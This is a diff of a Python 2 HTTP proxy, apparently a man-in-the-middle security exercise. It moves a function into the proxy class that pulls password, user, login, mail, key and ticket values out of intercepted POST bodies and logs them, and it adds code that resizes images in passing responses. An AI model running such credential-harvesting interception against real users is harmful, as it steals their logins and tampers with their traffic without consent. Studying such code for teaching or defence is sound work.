@@ -1,25 +1,87 @@
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
+import StringIO
 from urlparse import urlparse
 import httplib
 import logging
 import re
+import zlib
+from PIL import Image
+
 HOST_NAME = ''
 PORT_NUMBER = 4570
 
-interesting_parameters_list = ['pass', 'user', 'name', 'login', 'mail', 'key', 'ticket']
-def password_catcher(body):
-    parameters = body.split('&')
-    if len(parameters) < 2:
-        return
-    found_interesting_val = []
-    for kv_pair in parameters:
-        for interesting_parameters_list_value in interesting_parameters_list:
-            if len(re.findall(interesting_parameters_list_value, kv_pair)) > 0:
-                found_interesting_val.append(kv_pair)
-                break
-    return found_interesting_val
+
+
+
+
+
 
 class Proxy_Server(BaseHTTPRequestHandler):
+    interesting_parameters_list = ['pass', 'user', 'name', 'login', 'mail', 'key', 'ticket']
+    image_format_list = ['bmp', 'jpg', 'jpeg', 'png']
+
+
+    def response_content_handler(self, headers, body):
+        #  checking for image
+        content_type = ''
+        content_encoding = ''
+        for key in headers:
+            if key.lower() == 'content-type':
+                content_type = headers[key]
+            if key.lower() == 'content-encoding':
+                content_encoding = headers[key]
+        if len(re.findall('image', content_type)) < 1:
+            return headers, body
+
+        #  uncompresing
+        encoded_body = body
+        if content_encoding == 'gzip':
+            encoded_body = zlib.decompress(body)
+
+
+        #  handling image
+        im = Image.open(StringIO.StringIO(encoded_body))
+        if im.format.lower() not in self.image_format_list:
+            return headers, body
+        out = im
+        try:
+            out = im.resize(((im.size[0]+1)/2, (im.size[1]+1)/2))
+        except:
+            print 'Fabolous exception'
+        if out.size != ((im.size[0]+1)/2, (im.size[1]+1)/2):
+            out = im
+
+        output_image_buffer = StringIO.StringIO()
+        try:
+            out.save(output_image_buffer, format=out.format)
+        except:
+            output_image_buffer.close()
+            return headers, body
+        output_image = output_image_buffer.getvalue()
+        output_image_buffer.close()
+
+        for key in headers:
+            if key.lower() == 'content-length':
+                headers[key] = len(output_image)
+
+        return headers, output_image
+
+
+
+
+    def password_catcher(self, body):
+        parameters = body.split('&')
+        if len(parameters) < 2:
+            return
+        found_interesting_val = []
+        for kv_pair in parameters:
+            for interesting_parameters_list_value in self.interesting_parameters_list:
+                if len(re.findall(interesting_parameters_list_value, kv_pair)) > 0:
+                    found_interesting_val.append(kv_pair)
+                    break
+        return found_interesting_val
+
+
     def do_GET(self):
         global proxy_page_visit_logger
         global password_logger
@@ -33,7 +95,7 @@ class Proxy_Server(BaseHTTPRequestHandler):
         request_headers = self.headers.dict  # as dictionary
 
         if request_method == 'POST':
-            interesting_val = password_catcher(request_body)
+            interesting_val = self.password_catcher(request_body)
             if len(interesting_val) > 0:
                 log_info = self.path
                 for val in interesting_val:
@@ -69,17 +131,12 @@ class Proxy_Server(BaseHTTPRequestHandler):
                 break
         respone_headers['Connection'] = 'close'
 
-        found = False
         for key in respone_headers:
             if key.lower() == 'Content-Length'.lower():
                 respone_headers.pop(key, None)
                 break
-        if not found:
-            respone_headers['Content-Length'] = str(len(respone_data))
 
-
-
-
+        respone_headers, respone_data = self.response_content_handler(respone_headers, respone_data)
 
         # replying to Alice
         self.send_response(resp.status)
